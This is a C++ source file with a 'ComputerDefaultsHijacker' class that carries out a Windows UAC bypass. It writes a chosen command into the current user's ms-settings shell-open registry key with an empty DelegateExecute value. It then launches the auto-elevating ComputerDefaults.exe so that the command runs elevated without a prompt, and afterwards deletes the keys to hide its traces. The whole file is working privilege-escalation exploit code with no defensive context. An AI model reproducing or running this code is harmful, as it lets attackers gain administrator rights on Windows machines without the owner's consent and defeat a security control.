#include "pch.h"
#include "ComputerDefaultsHijacker.h"

void ComputerDefaultsHijacker::Install(LPCWSTR wzCommand)
{
	// Create registry tree
	Lib::CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");
	
	// Expand command
	WCHAR wzExpanded[MAX_PATH];
	ExpandEnvironmentStringsW(wzCommand, wzExpanded, _countof(wzExpanded));
	wzCommand = wzExpanded;

	// Set DelegateExecute value
	Lib::SetRegistryStringValue(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", L"DelegateExecute", NULL);
	
	// Set (Default) value to target command
	Lib::SetRegistryStringValue(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", NULL, wzCommand);
}

void ComputerDefaultsHijacker::Run()
{
	// Expand
	WCHAR wzExpanded[MAX_PATH];
	ExpandEnvironmentStringsW(L"%WinDir%\\System32\\ComputerDefaults.exe", wzExpanded, _countof(wzExpanded));

	LPWSTR wzCommand = _wcsdup(wzExpanded);

	// Start
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE hRet = ShellExecuteW(NULL, NULL, wzCommand, NULL, NULL, 0);
	if ((int)hRet <= 32)
		return;
	
	free(wzCommand);
}

void ComputerDefaultsHijacker::Uninstall()
{
	Lib::DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");
	Lib::DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open");
}